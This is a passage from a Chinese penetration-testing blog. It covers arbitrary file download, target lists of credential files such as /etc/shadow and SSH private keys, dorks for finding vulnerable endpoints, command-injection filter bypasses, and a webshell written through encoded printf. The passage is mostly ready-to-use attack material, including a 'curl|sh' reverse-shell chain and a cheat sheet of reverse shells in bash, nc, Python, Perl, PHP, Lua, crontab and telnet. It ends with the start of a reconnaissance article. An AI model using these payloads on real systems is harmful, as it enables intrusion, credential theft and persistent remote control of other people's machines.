<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//FileAcquisition.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    $filename = $_GET[<span class="string">'filename'</span>];  </span><br><span class="line">    <span class="keyword">echo</span> file_get_contents($filename);  </span><br><span class="line">    header(<span class="string">'Content-Type: imgage/jpeg'</span>);  </span><br><span class="line">    header(<span class="string">'Content-Disposition: attachment; filename='</span>.$filename);  </span><br><span class="line">    header(<span class="string">'Content-Lengh: '</span>.filesize($filename));  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/file1.png" alt="html">    </p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/file2.png" alt="html">    </p>
<p>跨目录下载：</p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/file3.png" alt="html">    </p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/file4.png" alt="html">    </p>
<p>说一下敏感文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//Windows下</span><br><span class="line">C:\boot.ini //查看系统版本</span><br><span class="line">C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件</span><br><span class="line">C:\Windows\repair\sam //存储系统初次安装的密码</span><br><span class="line">C:\Program Files\mysql\my.ini //Mysql配置</span><br><span class="line">C:\Program Files\mysql\data\mysql\user.MYD //Mysql root</span><br><span class="line">C:\Windows\php.ini //php配置信息</span><br><span class="line">C:\Windows\my.ini //Mysql配置信息</span><br><span class="line">C:\Windows\win.ini //Windows系统的一个基本系统配置文件</span><br><span class="line"></span><br><span class="line">//Linux下</span><br><span class="line">root/.ssh/authorized_keys ////如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去</span><br><span class="line">/root/.ssh/id_rsa //ssh私钥,ssh公钥是id_rsa.pub</span><br><span class="line">/root/.ssh/id_ras.keystore //记录每个访问计算机用户的公钥</span><br><span class="line">/root/.ssh/known_hosts //记录每个访问计算机用户的公钥</span><br><span class="line">/etc/passwd</span><br><span class="line">/etc/shadow //账户密码文件</span><br><span class="line">/etc/my.cnf //mysql配置文件</span><br><span class="line">/etc/httpd/conf/httpd.conf //apache配置文件</span><br><span class="line">/root/.bash_history //用户历史命令记录文件</span><br><span class="line">/root/.mysql_history //mysql历史命令记录文件</span><br><span class="line">/proc/mounts //记录系统挂载设备</span><br><span class="line">/porc/config.gz //内核配置文件</span><br><span class="line">/var/lib/mlocate/mlocate.db //全文件路径</span><br><span class="line">/porc/self/cmdline //当前进程的cmdline参数</span><br></pre></td></tr></table></figure>

<p>补：<a href="https://github.com/tdifg/payloads/blob/master/lfi.txt" target="_blank" rel="noopener">大佬搜集的一部分linux的敏感文件路径</a></p>
<p><strong>漏洞挖掘</strong>：</p>
<p>可以用Google hack：<code>inurl:&quot;file.php?file=&quot; inurl : readfile.php?file= inurl : download.php?file=</code></p>
<p>观察页面是否实现这种功能：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">download.php?path=</span><br><span class="line">download.php?file=</span><br><span class="line">down.php?file=</span><br><span class="line">data.php?file=</span><br><span class="line">readfile.php?file=</span><br><span class="line">read.php?filename=</span><br></pre></td></tr></table></figure>

<p>观察链接参数名路径名：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp;RealPath= &amp;FilePath= &amp;ﬁlepath= &amp;Filepath= &amp;Path= &amp;path= &amp;inputFile= &amp;Inputfile= &amp;url= &amp;urls= &amp;Lang= &amp;dis= &amp;data= &amp;Data= &amp;readﬁle= &amp;ﬁlep= &amp;src= &amp;menu=</span><br><span class="line"></span><br><span class="line">//java的重要路径</span><br><span class="line">/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line">/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">/WEB-INF/database.properties：数据库配置文件</span><br><span class="line">漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</span><br></pre></td></tr></table></figure>

<p>Linux下一种思路：在linux中有这样一个命令 locate 是用来查找文件或目录的，它不搜索具体目录，而是搜索一个数据库/var/lib/mlocate/mlocate.db。这个数据库中含有本地所有文件信息。Linux系统自动创建这个数据库，并且每天自动更新一次。可以算是一个杀器吧。</p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/locate.png" alt="html">    </p>
<h3 id="8-远程代码或系统命令执行-RCE"><a href="#8-远程代码或系统命令执行-RCE" class="headerlink" title="8.远程代码或系统命令执行(RCE)"></a>8.远程代码或系统命令执行(RCE)</h3><p>首先我们了解一下命令拼接符：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp;&amp;        第一个命令执行成功才会执行第二个命令否则不能继续执行</span><br><span class="line">&amp;		 即使第一个command1没有执行成功，也会执行command2 执行成功则都执行</span><br><span class="line">|    	 不管command1是否执行成功，都执行command2，不返回command1的结果 上一条命令的输出，作为下一条命令参数</span><br><span class="line">|| 		 表示上一条命令执行失败后，才执行下一条命令</span><br><span class="line">;		 分号表示命令依次执行。</span><br><span class="line"></span><br><span class="line">linux中：%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||</span><br><span class="line">windows中：%0a、&amp;、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符）</span><br></pre></td></tr></table></figure>

<p>这里我们以DVWA为例代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123;</span><br><span class="line">    $target = $_POST[ <span class="string">'ip'</span> ];</span><br><span class="line">    <span class="comment">//下面判断系统</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  '</span> . $target );</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Unix</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/DVWARCE.png" alt="html">    </p>
<p><strong>空格绕过</strong></p>
<p>Linux不能使用空格时的一些绕过 例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo$IFS&quot;&lt;?php system($_GET[x]);?&gt;&quot;&gt;shell.php  </span><br><span class="line">//$IFS$9,$&#123;IFS&#125;，$IFS 都可以 $IFS在linux下表示分隔符，但是如果单纯的cat$IFS2,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个&#123;&#125;就固定了变量名，同理在后面加个$可以起到截断的作用，但是为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/IFS.png" alt="html">    </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;echo,&apos;Melon&apos;&#125;&gt;test.php</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/wshell.png" alt="html"></p>
<p><strong>黑名单拼接绕过</strong></p>
<p><code>a=l;b=s;$a$b</code></p>
<p><strong>黑名单编码绕过</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">base64:</span><br><span class="line">echo &quot;bWVsb24K&quot;|base64 -d 其将会打印melon //echo &quot;字符串&quot; |base 则是直接加密</span><br><span class="line">echo &quot;Y2F0IC9mbGFn&quot;|base64-d|bash //等同于 cat /flag</span><br><span class="line"></span><br><span class="line">HEX:</span><br><span class="line">echo &quot;melon&quot; | xxd</span><br><span class="line">echo &quot;636174202f666c6167&quot; | xxd -r -p|bash</span><br><span class="line"></span><br><span class="line">oct:</span><br><span class="line">$(printf &quot;\154\163&quot;) //ls</span><br><span class="line">$(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;) //cat /flag</span><br><span class="line">&#123;printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|\$0 //cat /flag</span><br><span class="line">#可以通过这样来写webshell,内容为&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;</span><br><span class="line">$&#123;printf,&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;&#125; &gt;&gt; 1.php</span><br><span class="line"></span><br><span class="line">单引号和双引号绕过:</span><br><span class="line">例：ca&apos;&apos;t flag 或 ca&quot;&quot;t flag</span><br><span class="line"></span><br><span class="line">反斜杠绕过:</span><br><span class="line">比如：ca\t fl\ag</span><br><span class="line"></span><br><span class="line">利用Shell 特殊变量绕过:</span><br><span class="line">//n 是一个数字，表示第几个参数。例如，第一个参数是1，第二个参数是2。而参数不存在时其值为空。</span><br><span class="line">ca$@t fla$@g</span><br><span class="line">ca$1t fla$2g</span><br></pre></td></tr></table></figure>

<p><strong>长度限制绕过</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">需要用的知识点:</span><br><span class="line">linux下可以用 &gt;a 创建文件名为a的空文件 // &gt;是覆盖 &gt;&gt;是追加 我们一行一行写肯定选择追加</span><br><span class="line">ls -t&gt;test则会将目录按时间排序后写进test文件中 //我们需要反着写也就是从构造好的payload的下面写到上面</span><br><span class="line">sh命令可以从一个文件中读取命令来执行</span><br><span class="line">在linux中，当我们执行文件中的命令的时候，我们通过在没有写完的命令后面加 &quot;\&quot;，可以将一条命令写在多行</span><br></pre></td></tr></table></figure>

<p>测试在文本里内容如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//melon.txt 真实的话文件名要改成 a 因为是绕长度限制</span><br><span class="line">ec\</span><br><span class="line">ho \</span><br><span class="line">hello \</span><br><span class="line">world!</span><br></pre></td></tr></table></figure>

<p>执行：<code>sh melon.txt</code></p>
<p>那怎样将内容输出到文本当中就是我们需要做的事 </p>
<p>下面是我们的解决方案：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; &quot;rld&quot;</span><br><span class="line">&gt; &quot;wo\\&quot;</span><br><span class="line">&gt; &quot;llo \\&quot;</span><br><span class="line">&gt; &quot;he\\&quot;</span><br><span class="line">&gt; &quot;echo \\&quot;</span><br><span class="line">ls -t &gt; _</span><br><span class="line">sh _</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%8B%BC%E6%8E%A5hello.png" alt="html"></p>
<p>第一行显示找不到因为先创建 _ 文件再进行输出到_文件里。</p>
<p>这里使用了两个 \ 是因为我们需要转义掉多行命令的换行，如果我们只使用一个 \ 那么就会被误解为正在多行执行命令</p>
<p>这方面也有对应的CTF题目 源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(E_ALL);</span><br><span class="line">    $sandbox = <span class="string">'/var/www/html/sandbox/'</span>.md5(<span class="string">"orange"</span>.$_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>哪可不可以利用这种方法反弹shell呢？当然是可以的具体操作如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/vps的ip/监听的端口 0&gt;&amp;1 //标准的反弹shell命令</span><br><span class="line">&gt;\ \\</span><br></pre></td></tr></table></figure>

<p>这个时候我们遇到了两个个问题 </p>
<p>其一：<code>ls -t&gt;_</code> 也就是当我们吧文件全部创建好按时间将文件名输入到a文件中时发现我们的命令是七个字符我们需要一个先把这条命令写出来才行</p>
<p>其二：执行命令需要空格 但是我们需要两个空格 相同的文件怎么可以创建两个呢 这时候可以用 <code>curl url|sh</code> 的方式 只需要再服务器上构建好payload就可以了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">解决问题一</span><br><span class="line">&gt;ls\\ //创建 &quot;ls\&quot; 文件</span><br><span class="line">ls&gt;_  //将ls的排序写入&quot;_&quot;文件 此时文件内容为 &quot;_ ls\&quot;</span><br><span class="line">&gt;\ \\ //创建 &quot; \&quot;文件</span><br><span class="line">&gt;-t\\ //创建&quot;-t\&quot;文件</span><br><span class="line">&gt;\&gt;y  //创建&quot;&gt;y&quot;文件</span><br><span class="line">// ls命令排序的规则是空格和符号最前，数字其次，字母最后</span><br><span class="line">ls&gt;&gt;_ //将ls的排序追加到&quot;_&quot;文件</span><br><span class="line">//ls排序结果如下：</span><br><span class="line">&quot; \&quot;  &quot;_&quot;  &quot;ls\&quot;  &quot;-t\&quot; &quot;&gt;y&quot;</span><br><span class="line">追加之后&quot;_&quot;的内容为：</span><br><span class="line">_</span><br><span class="line">ls\</span><br><span class="line">\</span><br><span class="line">_</span><br><span class="line">ls\</span><br><span class="line">-t\</span><br><span class="line">&gt;y</span><br><span class="line">执行:sh _ 生成一个m文件</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们需要sh m 其中 m 中包含了 curl xx.xx.xx.xxx|sh</span><br></pre></td></tr></table></figure>

<p>构造payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;bash</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;x\\</span><br><span class="line">&gt;xx\\</span><br><span class="line">&gt;x.\\</span><br><span class="line">&gt;xx\\</span><br><span class="line">&gt;x.\\</span><br><span class="line">&gt;xx\\</span><br><span class="line">&gt;x.\\</span><br><span class="line">&gt;xx\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;rl\\</span><br><span class="line">&gt;cu\\</span><br><span class="line">//这里有一个坑就是创建文件不能以 .开头 否则为隐藏文件ls -t读取的时候读不到 我也尝试构造&quot;_&quot;的时候添加-a参数来达到目的 但好像不可能的事情 或许也是我没想到 欢迎师傅们提出意见 </span><br><span class="line">//为什么我要说到这里 因为我服务器的IP正好构造的时候会出现同名文件 以点开头构造又没法绕过 用域名云空间Github或者ip的每位全是三位的都可以 方法还是很多的</span><br></pre></td></tr></table></figure>

<p>利用：这时我们用”_”文件生成”y”文件 用y文件查看服务器反弹shell命令通过管道符执行命令 成功反弹shell</p>
<p><strong>内联执行</strong></p>
<p>命令替代，大部分Unix shell以及编程语言如Perl、PHP以及Ruby等都以成对的重音符(反引号)作指令替代，意思是以某一个指令的输出结果作为另一个指令的输入项。</p>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;a`pwd`&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/neilian.png" alt="html"></p>
<p><strong>通配符</strong></p>
<p>[…]<code>表示匹配方括号之中的任意一个字符。
比如</code>[aeiou]<code>可以匹配五个元音字母，</code>[a-z]`匹配任意小写字母。<br>{…}表示匹配大括号里面的所有模式，模式之间使用逗号分隔。</p>
<p><code>{...}</code>与<code>[...]</code>有一个很重要的区别。如果匹配的文件不存在，<code>[...]</code>会失去模式的功能，变成一个单纯的字符串，而<code>{...}</code>依然可以展开。</p>
<p>测试如下：</p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/catsh_1.png" alt="html"></p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/catsh_2.png" alt="html"></p>
<p><strong>反弹shell</strong></p>
<p>bash方式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ bash -c &quot;sh &gt;&amp; /dev/tcp/your ip/port 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>

<p>exec方式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ exec 5&lt;&gt;/dev/tcp/ip/port</span><br><span class="line">$ cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><br></pre></td></tr></table></figure>

<p>nc方式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">本机运行:</span><br><span class="line">nc -l -vv -p port</span><br><span class="line">目标主机:</span><br><span class="line">nc -e /bin/bash ip port</span><br></pre></td></tr></table></figure>

<p>python方式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &quot;exec(\&quot;import socket, subprocess;s = socket.socket();s.connect((&apos;ip&apos;,port))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</span><br></pre></td></tr></table></figure>

<p>Perl</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</span><br></pre></td></tr></table></figure>

<p>PHP</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -r &apos;$sock=fsockopen(&quot;ip&quot;,port);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br></pre></td></tr></table></figure>

<p>Lua</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;ip&apos;,&apos;port&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;</span><br><span class="line">#需要lua socket支持，且lua5.2+不支持luasocket</span><br></pre></td></tr></table></figure>

<p>crontab</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crontab -e编辑当前用户的任务，或者是写到计划任务目录，一般是 /var/spool/cron/ 目录，ubuntu是</span><br><span class="line">/var/spool/cron/crontabs。文件名为用户名root等。下面命令含义是每一分钟执行一次反弹shell命令。</span><br><span class="line"></span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">* * * * * /bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>telnet</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; telnet ip port 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure>

<p><strong>linux中直接查看文件内容的工具</strong></p>
<p>cat、tac、more、less、head、tail、nl、sed、sort、uniq</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>漏洞挖掘</tag>
        <tag>泄露</tag>
        <tag>注入</tag>
        <tag>webshll</tag>
        <tag>sql</tag>
        <tag>中间件</tag>
        <tag>未授权</tag>
        <tag>包含</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试之信息收集</title>
    <url>/2019/12/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<p>搞渗透的人应该都清楚，给一个目标站点做测试，第一步就是信息收集，通过各种渠道和手段尽可能收集到多的关于这个站点的信息，帮助我们更多的去找到渗透点。而信息收集的方式有很多，大致有搜索引擎、域名注册网站、shodan、github信息收集工具、网站公告等等，甚至还有社工的方式。</p>
<a id="more"></a>

<h2 id="1-拿到一个待检测的站。你觉得应该先做什么。"><a href="#1-拿到一个待检测的站。你觉得应该先做什么。" class="headerlink" title="1.拿到一个待检测的站。你觉得应该先做什么。"></a>1.拿到一个待检测的站。你觉得应该先做什么。</h2><p>收集信息：whois、网站源 IP、旁站、C 段网站、服务器系统版本、容器版本、程序版本、数据库类型、二级域名、防火墙、维护者信息。</p>
<h3 id="1-whois查询"><a href="#1-whois查询" class="headerlink" title="1.whois查询"></a>1.whois查询</h3><h4 id="可用信息：邮箱地址，注册人，作者信息"><a href="#可用信息：邮箱地址，注册人，作者信息" class="headerlink" title="可用信息：邮箱地址，注册人，作者信息"></a>可用信息：邮箱地址，注册人，作者信息</h4><p>​    <a href="http://www.whois.aliyun.com" target="_blank" rel="noopener">www.whois.aliyun.com</a> //阿里<br>​    <a href="http://www.whois365.com/cn/" target="_blank" rel="noopener">www.whois365.com/cn/</a> //全球查<br>​    <a href="http://whois.chinaz.com" target="_blank" rel="noopener">http://whois.chinaz.com</a> //站长<br>​    <a href="http://whois.aizhan.com" target="_blank" rel="noopener">http://whois.aizhan.com</a> //爱站</p>
<h4 id="kali自带"><a href="#kali自带" class="headerlink" title="kali自带"></a>kali自带</h4><pre><code>命令:whois www.xxx.com</code></pre><h3 id="2-备案查询"><a href="#2-备案查询" class="headerlink" title="2.备案查询"></a>2.备案查询</h3><h4 id="注册人姓名"><a href="#注册人姓名" class="headerlink" title="注册人姓名"></a>注册人姓名</h4><p>​    <a href="http://beianbeian.com" target="_blank" rel="noopener">http://beianbeian.com</a> //IPC备案查询<br>​    <a href="http://tianyancha.com" target="_blank" rel="noopener">http://tianyancha.com</a> //天眼查<br>​    <a href="http://beian.miit.gov.cn" target="_blank" rel="noopener">http://beian.miit.gov.cn</a> //工信部</p>
<h3 id="3-子域名收集"><a href="#3-子域名收集" class="headerlink" title="3.子域名收集"></a>3.子域名收集</h3><h4 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h4><ul>
<li><a href="https://github.com/TheRook/subbrute" target="_blank" rel="noopener">Subbrute</a> //快速枚举 DNS 记录和子域名。</li>
<li><a href="https://nmap.org/nsedoc/scripts/dns-brute.html" target="_blank" rel="noopener">Nmap</a> - 不仅仅只是端口扫描，可以使用脚本枚举子域名。使用 <code>--script dns-brute</code> 脚本。</li>
<li>谷歌语法:site:github.com</li>
<li><a href="https://github.com/ring04h/wydomain" target="_blank" rel="noopener">wydomain2</a> - 猪猪侠的作品，好用不解释。</li>
<li><a href="http://www.cnseay.com/4452/" target="_blank" rel="noopener">Layer 子域名挖掘机</a> //法师的作品，因为是用.NET写的，所以基本只能在Win下使用，也是相当好用的。</li>
</ul>
<h4 id="网站："><a href="#网站：" class="headerlink" title="网站："></a>网站：</h4><ul>
<li><a href="http://tool.chinaz.com/subdomain" target="_blank" rel="noopener">http://tool.chinaz.com/subdomain</a>   //站长工具</li>
<li><a href="https://censys.io" target="_blank" rel="noopener">https://censys.io</a>   //证书查找</li>
<li><a href="https://phpinfo.me/domain" target="_blank" rel="noopener">https://phpinfo.me/domain</a>   //在线子域名爆破工具</li>
<li><a href="https://virustotal.com/" target="_blank" rel="noopener">https://virustotal.com/</a> //cdn缓存查询 也提供恶意程序分析</li>
<li><a href="https://www.shodan.io/" target="_blank" rel="noopener">https://www.shodan.io</a> //无需多言，不仅可以看到子域名信息，还会显示对应的服务器版本及其他更多数据。</li>
</ul>
<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>子域名发现的原理无非就是以下几种：</p>
<ol>
<li>利用现有搜索引擎： <ul>
<li>网页搜索引擎（如：谷歌等）</li>
<li>空间搜索引擎（如：Shodan等）</li>
<li>SSL证书（如：crt.sh等），这个主要针对大站</li>
</ul>
</li>
<li>进行爆破，而爆破又分为两种： <ul>
<li>直接访问子域名</li>
<li>利用 DNS 请求</li>
</ul>
</li>
<li>其他泄露信息： <ul>
<li>如 crossdomain.xml 文件等</li>
<li>爬虫递归爬取等</li>
<li>DNS域传送漏洞等</li>
</ul>
</li>
</ol>
<h3 id="4-CMS识别"><a href="#4-CMS识别" class="headerlink" title="4.CMS识别"></a>4.CMS识别</h3><p>尽量搞明白web程序是用了什么CMS或者是用什么框架开发的<br>比如Thinkphp、Strust2。都有成熟的POC</p>
<h4 id="在线识别"><a href="#在线识别" class="headerlink" title="在线识别:"></a>在线识别:</h4><p><a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/look/</a> //识别很快python写的网站<br><a href="http://www.yunsee.cn" target="_blank" rel="noopener">www.yunsee.cn</a> //云悉</p>
<h4 id="本地识别"><a href="#本地识别" class="headerlink" title="本地识别"></a>本地识别</h4><p>御剑cms 大禹cms</p>
<h4 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h4><p>whatweb url</p>
<h3 id="5-敏感目录扫描"><a href="#5-敏感目录扫描" class="headerlink" title="5.敏感目录扫描"></a>5.敏感目录扫描</h3><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>​    御剑、Dirmap、wwwscan、DirBuster、Dirsearch、cansina。</p>
<h4 id="kali-1"><a href="#kali-1" class="headerlink" title="kali"></a>kali</h4><p>​    dirb url //命令行使用<br>​    dirbuster     //界面化工具<br>​    wordpress:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan -u http://www.baidu.comcom  //kali扫描WordPress漏洞</span><br></pre></td></tr></table></figure>

<h3 id="6-端口"><a href="#6-端口" class="headerlink" title="6.端口"></a>6.端口</h3><h4 id="端口信息收集："><a href="#端口信息收集：" class="headerlink" title="端口信息收集："></a>端口信息收集：</h4><h5 id="Windows："><a href="#Windows：" class="headerlink" title="Windows："></a>Windows：</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat -anbo       //windows查看开放端口及对应进程，-a查看所有连接和侦听端口，-n以数字方式显示地址和端口号，-b显示端口连接的程序，-o显示关联pid</span><br></pre></td></tr></table></figure>
<h5 id="Linux："><a href="#Linux：" class="headerlink" title="Linux："></a>Linux：</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat -tunlp       // -t (tcp) 仅显示tcp相关选项 -u (udp)仅显示udp相关选项 -n 拒绝显示别名，能显示数字的全部转化为数字 -l 仅列出在Listen(监听)的服务状态 -a (all)列出所有服务状态-p 显示建立相关链接的程序名</span><br></pre></td></tr></table></figure>
<h4 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h4><h5 id="本地工具"><a href="#本地工具" class="headerlink" title="本地工具"></a>本地工具</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -A -v -T4 &lt;目标IP&gt; //查看开放端口</span><br><span class="line">nmap &lt;目标IP&gt; -p &lt;探测端口&gt;</span><br><span class="line">masscan -p&lt;探测端口&gt; &lt;目标IP&gt; --rate=10000  //rate每秒发送的数据包</span><br></pre></td></tr></table></figure>
<h5 id="在线工具："><a href="#在线工具：" class="headerlink" title="在线工具："></a>在线工具：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://tool.chinaz.com/port    //站长工具</span><br></pre></td></tr></table></figure>
